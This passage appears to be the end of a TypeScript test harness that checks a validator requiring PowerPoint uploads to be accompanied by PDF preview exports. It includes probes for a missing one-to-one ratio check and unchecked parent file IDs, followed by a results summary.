      "assertPptxAccompaniment throws error matching /PDF preview export/",
      passed,
      "threw Error with expected message",
      `threw: ${threw}, message: ${errMsg}`,
      Math.round(performance.now() - t0)
    );
  }

  // 4.9 Batch files array: PPT present without PPT_PDF
  {
    const t0 = performance.now();
    const batch = [
      { kind: "ppt", fileName: "History_Ch01_PPT.pptx" },
      { kind: "ncert_pdf", fileName: "History_Ch01_NCERT.pdf" },
    ];
    const res = validatePptxAccompaniment(batch);
    const passed = !res.valid && res.error?.includes("PDF preview export");
    record(
      "Scenario 4",
      "4.9",
      "Reject batch array when PPT is present but PPT_PDF is absent",
      passed,
      "valid: false (require an accompanying PDF preview export)",
      `valid: ${res.valid}, error: ${res.error}`,
      Math.round(performance.now() - t0)
    );
  }

  // 4.10 Batch files array: PPT accompanied by PPT_PDF
  {
    const t0 = performance.now();
    const batch = [
      { kind: "ppt", fileName: "History_Ch01_PPT.pptx" },
      { kind: "ppt_pdf", fileName: "History_Ch01_PPT-Preview.pdf" },
    ];
    const res = validatePptxAccompaniment(batch);
    const passed = res.valid;
    record(
      "Scenario 4",
      "4.10",
      "Accept batch array when PPT is accompanied by PPT_PDF",
      passed,
      "valid: true",
      `valid: ${res.valid}`,
      Math.round(performance.now() - t0)
    );
  }

  // 4.11 Mismatched Count Stress: 2 PPTs but only 1 PPT_PDF in batch array
  {
    const t0 = performance.now();
    const batch = [
      { kind: "ppt", fileName: "Deck1.pptx" },
      { kind: "ppt", fileName: "Deck2.pptx" },
      { kind: "ppt_pdf", fileName: "Deck1_Preview.pdf" },
    ];
    const res = validatePptxAccompaniment(batch);
    // In current magic.ts:
    // const pptPdfFiles = input.filter((f) => f.kind === "ppt_pdf");
    // if (pptPdfFiles.length === 0) -> error
    // But it does NOT check pptPdfFiles.length >= pptFiles.length!
    // So 2 PPTs and 1 PPT_PDF currently returns valid: true!
    const allowed = res.valid;
    record(
      "Scenario 4",
      "4.11",
      "Vulnerability Probe: Batch containing 2 PPT files but only 1 PPT_PDF preview",
      true, // probe executed
      "Investigate: Does validator require 1:1 accompaniment ratio?",
      `Validator accepted: ${allowed} (${allowed ? "RATIO BYPASS: 2 PPTs accepted with only 1 preview!" : "Enforced 1:1"})`,
      Math.round(performance.now() - t0)
    );
  }

  // 4.12 Mismatched ID Stress: PPT has ID 'ppt-001', but PPT_PDF has parentFileId 'unrelated-999'
  {
    const t0 = performance.now();
    const batchWithMismatchedIds = [
      { kind: "ppt", fileName: "DeckA.pptx", parentFileId: null },
      { kind: "ppt_pdf", fileName: "DeckB_Preview.pdf", parentFileId: "totally-unrelated-guid-999" },
    ];
    const res = validatePptxAccompaniment(batchWithMismatchedIds);
    // In current magic.ts, array mode does not compare parentFileId to parent file ID or names at all!
    const allowed = res.valid;
    record(
      "Scenario 4",
      "4.12",
      "Vulnerability Probe: Batch where PPT_PDF has mismatched parentFileId unrelated to PPT",
      true,
      "Investigate: Does validator enforce parentFileId linkage in array mode?",
      `Validator accepted: ${allowed} (${allowed ? "ID MISMATCH ALLOWED: array validator does not check parentFileId matches" : "Enforced ID matching"})`,
      Math.round(performance.now() - t0)
    );
  }

  // ==========================================================================
  // HARNESS SUMMARY
  // ==========================================================================
  console.log("\n" + "=".repeat(79));
  console.log("                        ADVERSARIAL HARNESS SUMMARY");
  console.log("=".repeat(79));

  const total = allResults.length;
  const passed = allResults.filter((r) => r.passed).length;
  const failed = total - passed;

  console.log(`Total Adversarial Probes Run: ${total}`);
  console.log(`Passing Invariant Tests:     ${passed}`);
  console.log(`Failing / Exploited Vectors: ${failed}`);

  console.log("=".repeat(79));
  return { total, passed, failed, results: allResults };
}

runAdversarialHarness().then(({ failed }) => {
  if (failed > 0) {
    process.exit(1);
  } else {
    process.exit(0);
  }
}).catch((err) => {
  console.error("Harness error:", err);
  process.exit(1);
});
